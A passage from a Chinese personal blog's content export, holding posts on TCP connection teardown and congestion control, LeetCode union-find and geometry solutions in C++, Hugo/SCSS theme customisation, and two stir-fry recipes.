第一步：客户机打算关闭连接时，向服务器发送一个连接释放报文段，其中FIN标志位设置为1,同样占用一个序号即seq=x（这里的x与之前三次握手的x无关，只是一种表示）。此时发送FIN的一端不能再发送数据，但可以发送控制信息，可以接收数据。 第二步：服务器收到连接释放报文段之后发出确认。此时客户机到服务器方向的连接就释放了，但服务器还能发送数据，客户机仍要接收。 第三步：服务器数据也发送完毕，向客户机发出FIN=1的报文段。 第四步：客户机收到连接释放报文段后，发出确认。发出确认后连接还没有释放，必须等待计时器设置的时间2MSL后才进入关闭状态。   等待2MSL的必要性：\n第四步中客户机发出ACK之后需要等待2MSL才进入关闭状态。MSL（Maximum Segment Life）是指一个报文段在网络中存留的最长时间。等待的目的是为了保证服务器收到自己的ACK。\n在第三步中，服务器发出了FIN，但是此时并不能释放此次连接的资源，而要确保客户机收到了自己的FIN。\n客户机在第四步发出的ACK只有以下两种情况：\n 客户机发出的ACK到达了服务器，则服务器认为连接关闭，立即释放资源； 客户机发出的ACK没有到达服务器，那么服务器知道自己的FIN没有被收到，应该超时重传。  显然，在第二种情况中，如果服务器进行了FIN的重传，而客户机在发出ACK之后就先行释放了资源，那就造成了错误。\n于是，客户机在发出ACK后等待2MSL的时间：\n2MSL = 自己的ACK的最大存活时间 + 重传的FIN的最大存活时间\n简而言之，在第四步发出ACK之后，如果ACK没有到达，那么在2MSL时间内一定能收到对方重传的FIN，从而可以继续响应ACK；若2MSL时间内都没有收到任何信息，那么自己的ACK一定已经到达，连接可以正常关闭。\n  TCP可靠传输\n TCP的任务是在IP层不可靠的、尽力而为服务的基础上建立一种可靠数据传输服务，其使用了校验、序号、确认和重传等机制来达到这一目的。\n  校验\nTCP的校验机制和UDP是一样的。计算校验和时要在TCP/UDP数据报之前增加12B的伪首部，伪首部并不是真正的数据报首部，不实际发送，只是参与校验和的计算而已。添加了伪首部之后的数据报如下：\n\r添加伪首部的临时数据报\r\n校验和的计算方法是：将临时数据报视为许多16位的字链接起来，末尾不足则用0填充。使用二进制反码计算出这些16位字的和，并将此和的二进制反码写入真正数据报头部的校验位字段。\n  序号\nTCP首部的序号字段用来保证数据能有序提交给应用层，TCP把数据视为一个无结构但有序的字节流，序号建立在传送的字节流之上，而不建立在报文段之上。\nTCP连接传送的数据流中每个字节都编上一个序号。序号字段的值是本报文段所发送的数据的第一个字节的序号。例如一段数据有10个字节，分两个数据报传送，第一个数据报序号为0，包含0~5个字节，则第二个数据报的序号为6。\n  确认\nTCP首部的确认号是期望收到对方的下一个报文序号。按照上面的例子，如果对方收到了第一个数据报（序号0，包含0~5个字节），则返回的ack=6。\nTCP默认使用累计确认，即TCP只确认数据流中至第一个丢失字节为止的字节。\n  重传\n重传对于拥塞控制是比较重要的机制。有两种事件会导致TCP对报文进行重传：超时和冗余ACK。\n  超时\nTCP每发送一个报文段，就要对这个报文段设置一次计时器。计时器超时后要对这个报文进行重传。\n由于TCP的下层是一个互联网环境，IP数据报所选择的路由变化时刻影响传输层的往返时延。TCP的超时重传时间基于发送方测量得到的平均往返时间，具体细节不在本文讨论范围内。\n  冗余ACK\n超时重传存在的问题是显然的：周期太长。而冗余ACK使得发送方可以在超时之前注意到丢包现象的存在。冗余ACK就是再次确认某个报文段的ACK，而发送方先前已经收到过该报文段的确认。例如，发送方A发送了序号为1/3/5/7/9的报文段，而3号报文在传输过程中丢失。对于接收方B，它收到1号报文后接下来需要的是3号报文，而收到5号、7号、9号报文之后发现这些报文并不是当前需要的报文，于是发送3个对3号报文的ACK。TCP规定当发送方收到对同一个报文的3个冗余ACK时，就可以认为跟在这个被确认报文段之后的报文段已经丢失。\n     TCP流量控制\n 注意流量控制和拥塞控制的本质区别：流量控制是指点对点的通信量的控制，其根本目的是使发送方的发送速率和接收方的接收速率匹配；拥塞控制是让网络能够承担现有的网络负荷，是一个全局性的过程，涉及所有的主机、所有的路由器，以及与降低网络传输性能有关的所有因素。\nTCP的发送端和接收端都维护发送窗口和接收窗口，接收方可以设置TCP头部的窗口字段来告诉发送方自己的窗口大小，使发送方对发送窗口进行动态调整。\n TCP拥塞控制\n 发送方除了使自己发送的数据能够吻合接收端的接收速率之外，还需要考虑自己的发送速率对网络的影响。当网络负载较大的时候，发送速率应该减小，以免加重网络的负载。\n因此，发送方需要维护以下两个窗口：\n 接受窗口rwnd，反映接收方的容量； 拥塞窗口cwnd，根据自己估算的网络拥塞程度设置的窗口值，反映网络的当前容量。  显然，真正的发送窗口大小 = min(rwnd, cwnd)。\n为了更好地对传输层进行拥塞控制，因特网建议标准定义了4种算法：慢启动、拥塞避免、快重传、快恢复。\n  慢启动\n在TCP刚刚连接好并开始发送TCP报文段时，先令拥塞窗口cwnd = 1，即刚开始时只能发送一个最大报文段（MSS）。\n每经过一个传输轮次（经过一次往返时延RTT之后），拥塞窗口加倍，在这种算法下cwnd的大小指数式增长。我们从一开始就需要规定一个慢开始门限ssthresh，即阈值，拥塞窗口大小一直指数增长到这个阈值之后，改用拥塞避免算法。\n  拥塞避免算法\n拥塞避免算法要求：\n 发送端的拥塞窗口cwnd每经过一个往返时延RTT就增加一个MSS的大小。在这种算法下cwnd按线性规律缓慢增长（加法增大）； 每当出现一次超时，令慢开始门限（阈值）等于当前cwnd的一半（乘法减小），然后将cwnd设置为1，重新慢启动。  慢启动和拥塞避免的实现过程如下：\n\r慢启动和拥塞避免\r\n 注意在慢开始（指数增长）阶段，若2 * cwnd \u0026gt; ssthresh，则下一个RTT的cwnd 等于ssthresh；即cwnd不能跃过ssthresh值。\n   快重传\n先前提过，发送端收到连续三个冗余ACK时，就能进行重传，而不必等待计时器超时。此即“快重传”。\n  快恢复\n快恢复是为了配合快重传而定义的算法。它规定：发送端收到连续三个冗余ACK时执行“乘法减小”算法，即将慢开始门限设置为此时cwnd的一半，然后把cwnd的值设置为改变后的阈值，直接进行加法增长。\n显然，快恢复不需要cwnd从1开始时的慢启动过程，所以它比较“快”。\n两种算法实现的比较如下：\n\r快恢复算法的实现过程\r\n 为什么快重传要搭配快恢复？\n在拥塞避免算法中，重传的情况是计时器超时，说明此时不管是自己的数据报还是对方的ACK都已经无法送达，网络的负载已经很大，直接将自己的拥塞窗口减成1，是一种比较高效的限流措施；\n在快重传情况下，能够收到三次冗余ACK，说明网络中还是能够通过一些数据报的，此时将拥塞窗口减半，直接开始拥塞避免算法（加法增长），对性能的影响较小。\n   小结 本文对重要的传输层协议——TCP进行了较为全面的梳理，包括TCP报文段格式、TCP连接管理、TCP可靠传输、流量控制和拥塞控制。\n本文多数内容来自参考资料[2]，少数内容来自网络，对部分知识点进行了补充。参考资料难免不够全面，对本文中的内容有任何疑问处请在评论区留言。\n参考资料 [1] 车小胖.为什么TCP4次挥手时等待为2MSL？[EB/OL].2017-10-23\nhttps://www.zhihu.com/question/67013338\n[2] 王道论坛.2021年计算机网络考研复习指导[M].北京:电子工业出版社,2020:209-246\n[3] 李卓航.TCP的三次握手与四次挥手理解及面试题（很全面）[EB/OL].2019-06-29\nhttps://www.cnblogs.com/bj-mr-li/p/11106390.html\n[4] 小狼的世界.Wireshark使用入门[EB/OL].2019-06-23\nhttps://www.cnblogs.com/cocowool/p/wireshark_tcp_http.html\n[5] sean-zou.TCP报文格式[EB/OL].2014-06-10\nhttps://blog.csdn.net/a19881029/article/details/29557837\n","date":"2021-01-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AEtcp/","title":"传输层协议——TCP"},{"content":"题目链接：https://leetcode-cn.com/problems/regions-cut-by-slashes/\n令我思考很久的一道题，最后还是学着官方题解做出来的([1])。思考过程中也想过并查集，然而并没有想到题解中的做法；想到过求一个图中环路的个数，然而不会。\n题目 在由 1 x 1 方格组成的 N x N 网格 grid 中，每个 1 x 1 方块由 /、\\ 或空格构成。这些字符会将方块划分为一些共边的区域。\n（请注意，反斜杠字符是转义的，因此 \\ 用 \u0026ldquo;\\\\\u0026rdquo; 表示。）。\n返回区域的数目。\n分析  将单元格进一步细分，便于并查集操作。\n每个单元格对角点互连，即可分成四个小三角形（图1），根据本格中的字符是/还是\\，合并不同的小三角形。\n\r图1. 单元格划分\r\n  格内合并\n 当本格字符为空格时，所有小三角形处于同一个区域中，全部合并； 当本格字符为/时，合并0号和3号，合并1号和2号，且这两个区域不互通； 当本格字符为\\时，合并0号和1号，合并3号和2号，且这两个区域不互通。    格间合并\n 格间合并是指单元格之间的小三角形合并。无论本单元格中的字符是什么，当前单元格的1号三角形和右边单元格的3号永远处于同一个区域，当前单元格的2号和下边单元格的0号永远处于同一个区域。同理考虑左边和上边单元格。 我们要遍历所有的单元格，故格间合并只需要顾及左右两侧邻居之一、上下两侧邻居之一即可；例如对于每个单元格只考虑与其右边单元格和下边单元格的合并，每个单元格都如此，则所有单元格都能正常完成合并。    最终操作\n 遍历每个单元格，按照字符进行格内合并；如果右边和下边有邻居就进行格间合并。这样最后剩下的独立并查集个数就是最终划分得到的区域数。 这种方式的关键在于格间合并，无论格内字符是什么，格间的联通总能使得离散的区域聚到一起。     模拟  考虑对于示例4：\n 输入：[\u0026quot;/\\\\\u0026quot;,\u0026quot;\\\\/\u0026quot;] 输出：5  网格如下：\n\r图2. 网格\r\n我们从左上到右下进行遍历。\n首先第一个单元格进行格内合并：\n\rStep1\r\n第一个单元格的格间合并，从此图中就不难看出格间合并的规律与格内字符无关。\n\rStep2\r\n第二个单元格的格内合并：\n\rStep3\r\n格间合并，此时它已经没有右邻居：\n\rStep4\r\n第三、第四个单元格分别格内、格间合并，最终得到的各个独立集合如下：\n\rFinal\r\n AC代码  将上面的模拟转化成代码，其关键在于单元格和小三角形的表示。我们将二维的网格拉直，则一个坐标(x, y)的单元格位于一维数组中的n * x + y处；每个单元格分为4个小三角形，故一个单元格占据4个数组空间。\n最终，坐标(x, y)的单元格位于4 * (n * x + y)到4 * (n * x + y) + 3的下标位置。\n则最终的一维数组即并查集需要开辟的大小为4 * n * n。\n class UnionFind { private: int f[10000]; int cnt; public: UnionFind(int n) { for (int i = 0; i \u0026lt; 4 * n * n; i++) { f[i] = i; } cnt = 4 * n * n; } int getCnt() { return cnt; } int find(int n) { if (f[n] == n) return n; f[n] = find(f[n]); return f[n]; } void Union(int a, int b) { int ra = find(a); int rb = find(b); if (ra == rb) return ; else if (ra \u0026lt; rb) f[rb] = ra; else if (ra \u0026gt; rb) f[ra] = rb; // cout \u0026lt;\u0026lt; \u0026#34;Union \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#34; with \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; endl;  cnt--; return ; } }; class Solution { public: int regionsBySlashes(vector\u0026lt;string\u0026gt;\u0026amp; grid) { int n = grid.size(); UnionFind uf(n); for (int x = 0; x \u0026lt; n; x++) { for (int y = 0; y \u0026lt; n; y++) { int base = 4 * (x * n + y); // 0,4,8,...  /* 格内合并 */ if (grid[x][y] == \u0026#39; \u0026#39;) { uf.Union(base, base + 1); uf.Union(base, base + 2); uf.Union(base, base + 3); } else if (grid[x][y] == \u0026#39;/\u0026#39;) { uf.Union(base, base + 3); uf.Union(base + 1, base + 2); } else if (grid[x][y] == \u0026#39;\\\\\u0026#39;) { uf.Union(base, base + 1); uf.Union(base + 2, base + 3); } /* 格间合并 */ if (y \u0026lt; n - 1) // 还有右邻居  uf.Union(base + 1, base + 7); // 己方1，右邻居3  if (x \u0026lt; n - 1) // 还有下邻居  uf.Union(base + 2, base + 4 * n); // 己方2，下邻居0  } } return uf.getCnt(); } }; 表现还不错，叉会儿腰。\n\rPerformance\r\n参考资料 [1] 力扣官方题解.由斜杠划分区域[EB/OL].2021-01-24\nhttps://leetcode-cn.com/problems/regions-cut-by-slashes/solution/you-xie-gang-hua-fen-qu-yu-by-leetcode-s-ztob/\n","date":"2021-01-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode959.-%E7%94%B1%E6%96%9C%E6%9D%A0%E5%88%92%E5%88%86%E5%8C%BA%E5%9F%9F/","title":"难题本 | LeetCode959. 由斜杠划分区域"},{"content":"总不能让这个博客老是在记录家常菜啊。\n本篇主要介绍hugo博客的进阶美化方法，根据本篇的讲解，结合自己的主题进行实践，有助于打造一个真正属于自己的博客。\n 1. CSS和SCSS  CSS（层叠样式表）是一种用来表现HTML或XML等文件样式的计算机语言。CSS的存在使得HTML页面源码可以更专注于网页架构的设计，而不用在源码中加入许多关于样式的字段，极大地提高了代码的可读性和简洁性，同时，使得网页样式变得更好维护。\nSass（Syntatically Awesome Style Sheets）是一种CSS预处理器，它可以用来定义一套新的语法规则和函数，以加强和提升CSS。\n举例来说，一个页面中可能需要用到许多次颜色#000，即白色；在原始的CSS代码中这个#000需要不断地出现在各个位置，如color: #000、background: #000等，这就为样式的改变带来了麻烦，假如我们需要整体性地改变页面颜色主题，就只能找到所有的#000并将其修改，实在不够方便。而Sass引入了变量，其概念和C/C++等语言中的变量并无二致，极大地简化了数值的维护。现在可以使用如下的写法来设置页面颜色：\n$WHITE: #000; /* 设置变量 */ .code { background: $WHITE; } .header { color: $WHITE; } 然而，最初的Sass的语法规则和CSS有太多的出入，后来官方在2010年推出了一个全新的语法，叫做SCSS（Sassy CSS），试图弥合Sass和CSS之间的差别。现在我们看到的代码多数已经是SCSS，而其灵魂就是变量，如此理解便好。\n 2. hugo和SCSS  hugo支持SCSS，因此你所能见到的较为现代的主题多是使用SCSS来定义样式。\n你的网站样式存放在根目录下asset/css文件夹中，不同的主题可能有不同的组织形式，其结构总体上类似于一个分工良好的C/Python程序——各个部位的样式分成各个独立的文件来进行定义，最终使用一个主文件将各个模块include/import进来，实现完整的页面样式。\n我的KeepIt主题有一个内容如下的主文件，功能正如我所述：\n\rmain.scss\r\n按照import的顺序，HTML文档中的各个标签、各个Class都被其相应的文件赋上了特定的样式，最终形成了一个和谐美观的主题。\n如果你了解CSS，应该知道CSS中的“覆盖”原则，即对于同一个选择器，其后面的属性会覆盖先前出现的属性。比如对于名为str的类，我们的CSS文件中存在两种定义：\n/* line 11 */ .str { color: #efefef; } ... /* line 20 */ .str { color: #ffdab9; } 那么，位于20行的定义会覆盖位于11行的定义，使得具有str类的标签内容呈现#ffdab9这种颜色。\n这种覆盖原则就是我们自定义hugo样式的基础。\n 3. 精确定义样式  基于上面提到的覆盖原则，我们能够对指定的选择器进行多次的样式定义，而最终效果以最后一次定义为准，类似于变量的多次赋值。\n在我所知道的hugo主题中，asset/css目录中都有_custom.scss文件，这个文件就是让用户自定义样式的地方。至于为什么可以用这个文件实现样式的自定义，我们可以重新看看main.scss的最后几行：\n\rmain.scss的最后几行\r\n可以看到，最后一行引入了_custom.scss文件，这使得定义在其中的样式位于最终CSS文件的末尾，其中重复定义的样式会被作为页面的最终效果。\n于是我们的问题就变得很简单了：找到你希望修改的元素和它对应的选择器，重新定义这个选择器即可。\n所幸，现代浏览器为我们提供的开发者工具使得这一切都变得无比简单。以Edge Beta为例，按下F12弹出开发者工具，使用左上角的小箭头使你的鼠标变成一个查看器，现在你点击页面上的任何元素，立即可以在右边的窗口看到这个元素对应的源码。\n例如，在我的博客中有这样的元素已经让我不爽很久了：\n\r精确选取元素\r\n可以看到跟这个project相同的aboutme.md这个单词被拆成了两半，真是岂有此理。\n现在我们希望这样的元素以后都单独位居一行。可以在右边开发者工具的下半部分看到这个元素对应的CSS，试着改改它的样式，结果真是令人高兴！\n\r在开发者工具中修改样式\r\n\r效果\r\n在这里，我将此类元素的background变深了一些；直接用鼠标在最后一行的位置单击，就可以新加入一个white-space: nowrap;的样式，这使得此类元素被强制不换行，看着真是舒服多了！\n效果已经这么好了，我们不妨就将这部分代码（选择器+样式）直接放入_custom.scss，那么理论上来说，这部分样式将覆盖主题原有的效果：\n\r在SCSS文件中修改样式，包括暗黑模式的样式\r\n使用hugo server在本地试试，Hmm\u0026hellip;Not bad！\n\r本地效果\r\n\r本地效果（黑）\r\n以上就是本篇的全部内容。\n 参考文献\n[1] 新西兰程序员.CSS,Sass,SCSS关系[EB/OL].2018-10-10\nhttps://www.cnblogs.com/wphl-27/p/9765647.html\n[2] 选择远方.css强制不换行[EB/OL].2019-03-11\nhttps://blog.csdn.net/qq_40713392/article/details/88411432\n[3] 百度百科.CSS（层叠样式表）[EB/OL]\nhttps://baike.baidu.com/item/CSS/5457?fr=aladdin\n","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%973/","title":"博客搭建指南——3"},{"content":"家常菜记录第二篇。\n鸭肉又干又柴，丝瓜食之无味，两者结合倒是有不错的效果。\n 食材\n 瘦鸭肉切成片状（不在图中），大蒜少许，胡萝卜若干，丝瓜一盆。\n\r食材\r\n 制作流程\n 1. 油炸鸭肉\n 首先将鸭肉片裹上木薯粉（或者炸粉），不必太多，使得肉看起来仍是肉色，放置片刻； 锅底放入适量油； 放鸭肉，此时的油应该能够没过肉。油炸数分钟使鸭肉表面呈现深棕色，然后将鸭肉取出。 \rStep1\r \rStep1.1\r  2. 加胡萝卜\n 将刚才的油取出少许，使得剩余的油没过锅底即可； 放入蒜炒香，放入胡萝卜。 \rStep2\r  3. 加丝瓜\n 将丝瓜倒入锅中，看似很多，之后炒制将会缩水。 \rStep3\r  4. 焖制\n 加入适量水之后盖上锅盖焖制，其间适时开盖翻炒。 整个过程大约数分钟。  5. 加调味料，加鸭肉\n 加入盐、糖、味精，翻炒均匀； \rStep4\r 加入之前炸制的鸭肉。翻炒均匀。 \rStep5\r  6. 出锅\n 鸭肉本柴，裹粉油炸使得口感得到较好的改善；丝瓜无味，正适合解油除腻。 \rFinal1\r \rFinal2\r  ","date":"2021-01-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E4%B8%9D%E7%93%9C%E7%82%92%E9%B8%AD%E8%82%89/","title":"食记 | 丝瓜炒鸭肉"},{"content":"开启了新的分类——日常篇。\n从知识分享到知识记录，最终此博客大概要变成无所不包的地方罢。\n本文忠实地记录一道家常菜的做法：荷兰豆炒腊肠（名字我乱起的）。这道菜为荷兰豆附上了腊肠的香气，且不失其青翠本色，是我个人接受度较高的一种荷兰豆的做法。\n 食材\n 荷兰豆若干，大蒜少许，胡萝卜若干（点缀颜色），瘦肉若干，腊肠切片，火腿肠切片（可选）。\n\r食材\r\n 制作流程\n 1. 热油，放蒜炒香\n 这一步大概是家常菜中的起手式了。由于荷兰豆并不是特别吸油，加上腊肠本身在炒制的过程中会出油，这一步的油量放到盖过锅底即可。翻炒数下，香味顿起，不食蒜者可将蒜捡出。 \rStep1\r  2. 加胡萝卜\n 个人觉得胡萝卜在这道菜中的作用就是点缀一点颜色，放或不放皆可。胡萝卜早放则出锅之后口感较为柔软，晚放则生脆，自行斟酌。 \rStep2\r  3. 加腊肠和瘦肉\n 油香立变。 \rStep3\r  4. 加荷兰豆和火腿肠\n 初加荷兰豆时，其表面暗淡；翻炒数下即青翠欲滴。可以在此步加入火腿肠，以此法做出的火腿肠别具风味。 \rStep4\r \rStep5\r  5. 盖上锅盖焖制，加调味料\n 盖上锅盖焖制数分钟，其间适时开盖翻炒，使油和菜混匀；适量加水以免出现焦味；数分钟后，加调味料（盐、味精、糖、酱油），翻炒均匀，可再焖制数十秒，随后出锅。 此步无图。  6. 成品\n 此法做出的荷兰豆光泽明亮，入口有腊肠香味，细嚼则有清香，并不肥腻。 \rFinal\r  ","date":"2021-01-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%A3%9F%E8%AE%B0-%E8%8D%B7%E5%85%B0%E8%B1%86%E7%82%92%E8%85%8A%E8%82%A0/","title":"食记 | 荷兰豆炒腊肠"},{"content":"题目链接：https://leetcode-cn.com/problems/check-if-it-is-a-straight-line/\n题目 在一个 XY 坐标系中有一些点，我们用数组 coordinates 来分别记录它们的坐标，其中 coordinates[i] = [x, y] 表示横坐标为 x、纵坐标为 y 的点。\n请你来判断，这些点是否在该坐标系中属于同一条直线上，是则返回 true，否则请返回 false。\n分析 这种题目居然WA了一次。。。\n依题意，判断给出的所有点是否都在同一直线上，我们只需要按照前两点的坐标计算斜率和截距，得到由前两点确定的直线方程，将后面的坐标套入此方程即可。\n这题的特殊情况有两种：\n 一共只给出两个点。两点确定一条直线，直接返回true。 所有点垂直于x轴。这样的直线没有斜率，需要单独拎出来讨论（第一次提交就挂在这里了）。  直接放代码了。\nclass Solution { public: bool checkStraightLine(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; coordinates) { // ax1 + b = y1; ax2 + b = y2  // a(x1 - x2) = y1 - y2  // a = (y1 - y2) / (x1 - x2)  // b = y1 - ax1  if (coordinates.size() == 2) return true; bool vertical = false; // 垂直，无斜率  float a = 0, b = 0; if (coordinates[0][0] == coordinates[1][0]) vertical = true; else { a = (float)(coordinates[0][1] - coordinates[1][1]) / (coordinates[0][0] - coordinates[1][0]); b = coordinates[0][1] - a * coordinates[0][0]; } if (vertical) { for (int i = 2; i \u0026lt; coordinates.size(); ++i) if (coordinates[i][0] != coordinates[0][0]) return false; } else { for (int i = 2; i \u0026lt; coordinates.size(); ++i) { if (a * coordinates[i][0] + b != coordinates[i][1]) return false; } } return true; } }; ","date":"2021-01-17T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode1232.-%E7%BC%80%E7%82%B9%E6%88%90%E7%BA%BF/","title":"错题本 | LeetCode1232. 缀点成线"},{"content":"题目链接：https://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/\n题目 n 块石头放置在二维平面中的一些整数坐标点上。每个坐标点上最多只能有一块石头。\n如果一块石头的 同行或者同列 上有其他石头存在，那么就可以移除这块石头。\n给你一个长度为 n 的数组 stones ，其中 stones[i] = [xi, yi] 表示第 i 块石头的位置，返回 可以移除的石子 的最大数量。\n示例1\n 输入： stones = [[0,0],[0,1],[1,0],[1,2],[2,1],[2,2]] 输出： 5 解释： 一种移除 5 块石头的方法如下所示：  移除石头 [2,2] ，因为它和 [2,1] 同行。 移除石头 [2,1] ，因为它和 [0,1] 同列。 移除石头 [1,2] ，因为它和 [1,0] 同行。 移除石头 [1,0] ，因为它和 [0,0] 同列。 移除石头 [0,1] ，因为它和 [0,0] 同行。 石头 [0,0] 不能移除，因为它没有与另一块石头同行/列。    分析 其实不知道这题该算错题还是难题，毕竟它的思路是简单的，但是我并没有想到。\n暂且归为错题罢。借由此题捡回了并查集的相关知识，在实现并查集的过程中有一些细节上的错误导致了一次WA，本篇将加以记录。\n分析：\n 由题意可知，在同一行或同一列上的石头属于同一个集合。显然，这样的集合永远可以找到一个删除的顺序，使得集合中只剩下唯一一个石头。\n于是题目转化为了以行列为依据的并查集问题。对于一块石头idx，其坐标为(x, y)，如果x行上已经有了先来的石头root_x[x]，那么将idx加入先前就存在的root_x[x]的并查集中；否则表示idx是这一行最先到达的石头，其后的所有石头都要加入idx的并查集中。对于y列来说同理。\n于是实现并查集如下：\nint parent[1010]; // 并查集 // memset(parent, -1, sizeof(parent)); // 或者 // for (i = 0; i \u0026lt; 1010; i++) parent[i] = i; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // 路径压缩  return parent[idx]; } 我们遍历所有石头，谁先到达某一行，之后这一行上的石头都要作为它的子节点；谁先到达某一列，之后这一列上的石头都要作为它的子节点。\n这一轮遍历之后，所有同行同列的石头都处于同一个并查集中；而全局中并查集的个数就是剩余的石头个数。\nclass Solution { public: int parent[1010]; // 并查集  int root_x[10010]; int root_y[10010]; void join(int parent_idx, int son_idx) { int root_p = find(parent_idx); int root_s = find(son_idx); if (root_p == root_s) return; else parent[root_s] = root_p; } int find(int idx) { if (parent[idx] == -1) return idx; parent[idx] = find(parent[idx]); // 路径压缩  return parent[idx]; } int removeStones(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; stones) { int idx, x, y; memset(parent, -1, sizeof(parent)); memset(root_x, -1, sizeof(root_x)); memset(root_y, -1, sizeof(root_y)); for (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } int cnt = 0; for (idx = 0; idx \u0026lt; stones.size(); ++idx) { if (find(idx) == idx) { ++cnt; cout \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } } return stones.size() - cnt; } };  错误记录\n 并查集中的join函数，原本的写法为：\nvoid join(int parent_idx, int son_idx) { parent[son_idx] = parent_idx; } 这样的写法是错误的，且非常之离谱。我们知道，两个属于不同并查集的元素的合并意味着两个并查集的合并，显然不能单纯地修改这两个元素本身，而要考虑到这两个并查集的根节点。\n就本题来说，这样的写法无法通过这个测试样例：\n[[0,1],[1,0],[1,1]] 对于最后一块石头(1, 1)，第1行已经有了石头1，第1列已经有了石头0。按照遍历过程的逻辑：\nfor (idx = 0; idx \u0026lt; stones.size(); ++idx) { x = stones[idx][0]; y = stones[idx][1]; if (root_x[x] == -1) { root_x[x] = idx; } else { join(root_x[x], idx); } if (root_y[y] == -1) { root_y[y] = idx; } else { join(root_y[y], idx); } } 最后一块石头最终将加入0号并查集。且此时剩余独立的并查集有0和1。\n然而，最后一块石头实际上是0和1的交汇点。按照正确的流程，它根据x坐标首先加入1号并查集后，再加入0号并查集，这时就会将1号石头也带入0号并查集，这也是本题使用并查集思路的正确性所在。\n正确的办法是在合并时考虑根节点的修改，详见前文代码。\n此外，本题使用的并查集还可以进行优化，包括针对本题的封装（参考[1]），和针对并查集这一结构本身的按秩合并和路径压缩（参考[2]）。\n本题还有基于图论的解法，不在本篇讨论范围内。\n 参考资料\n[1] 小宇.简单思路+优化（超100%）[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/jian-dan-jie-fa-chao-100-by-mantoufan-k3ne/\n[2] yex.【详解】并查集[EB/OL].2021-01-15\nhttps://leetcode-cn.com/problems/most-stones-removed-with-same-row-or-column/solution/tu-jie-bing-cha-ji-by-yexiso-nbcz/\n","date":"2021-01-15T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode947.-%E7%A7%BB%E9%99%A4%E6%9C%80%E5%A4%9A%E7%9A%84%E5%90%8C%E8%A1%8C%E6%88%96%E5%90%8C%E5%88%97%E7%9F%B3%E5%A4%B4/","title":"错题本 | LeetCode947. 移除最多的同行或同列石头"},{"content":"题目链接：https://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k/\n这题的思路真是弯弯绕绕，看了很多份题解，最后还是我BUPT学长的一通模拟让我悟道了[1]。\n分析：\n 题目要求返回数组A的最短的非空连续子数组的长度，该子数组的和至少为K。\n最开始想到的是暴力。假设数组长度为n，我们分别求出长度为1、2、\u0026hellip;、n的子数组的最大和，将他们按顺序和K比较，第一个比K大的长度就是答案。这样的做法时间复杂度是O(n2)，有点复杂。\n之后就没有想法了。跟泓泓挣扎了半天，还是只能去看题解。\n不得不说，官方题解真是不讲人话[2]，不到40行代码的思路，硬是能被说成鬼都看不懂的样子。\n首先，为了方便求任意一段连续子数组的和，我们需要使用前缀和数组prefix_sum。在这个题目中，prefix_sum[i]表示的是从A[0]到A[i - 1]的前缀和，注意是A[i - 1]，作用后面会讲。总之，求前缀和的办法是很常规的。\n我们知道，求得了前缀和数组之后，对于两个下标x、y（设y\u0026gt;x），prefix_sum[y] - prefix_sum[x]表示的就是从A[x + 1]到A[y]这段子数组的和。那么，问题就转化为了针对prefix_sum数组，求一对x和y，满足prefix_sum[y] - prefix_sum[x] \u0026gt;= K，且y - x最小。\n朴素的思想是遍历每一对y和x，这样的复杂度还是O(n2)，显然需要用某种更巧妙的办法让我们摆脱两重循环。\n于是引出官方题解中的第一条性质：\n 对于prefix_sum数组，假设有下标**a \u0026gt; b**，且prefix_sum[a] \u0026lt;= prefix_sum[b]，那么对于它们后面的某个下标y来说，只需要考虑a ~ y这一段是否满足条件，而不再需要考虑b ~ y这一段了。这是因为，prefix_sum[y] - prefix_sum[a] \u0026gt;= prefix_sum[y] - prefix_sum[b]，而且y - a \u0026lt; y - b，如果b ~ y这一段能满足条件，那么a ~ y这一段也一定能满足条件，而且这段子数组的长度更小。  如果我没有讲清楚，不妨看看参考[1]中的模拟大法：\n\r本条性质的模拟\r\n我们使用一个双端队列deque来利用这个性质。让下标从前往后走，保持deque中保存的下标x0、x1、\u0026hellip;始终满足prefix_sum[x0] \u0026lt; prefix_sum[x1] \u0026lt; ...；注意，由于下标是从前往后走的，当出现了某个prefix_sum[x_m] \u0026lt; prefix_sum[deque.back()]的时候，说明对于之后的下标y来说，x_m是更为合适的选择，也因此可以直接将队尾的元素剔除。\n使用下面的代码来进行实现，注意deque的初始元素0。\n// deque\u0026lt;int\u0026gt; monoq;\t// 变量名与官方题解保持一致 monoq.push_back(0); // 放入一个0 for (i = 1; i \u0026lt;= A.size(); ++i) // 下标从前往后走 { while (!monoq.empty() \u0026amp;\u0026amp; prefix_sum[monoq.back()] \u0026gt;= prefix_sum[i]) { monoq.pop_back(); // 当前这个i满足性质一，使得后续的y只需要考虑下标i  } ... } 实现了性质一，需要引出性质二：\n 对于一个固定的下标x来说，第一次遇见某个y满足prefix_sum[y] - prefix_sum[x] \u0026gt;= 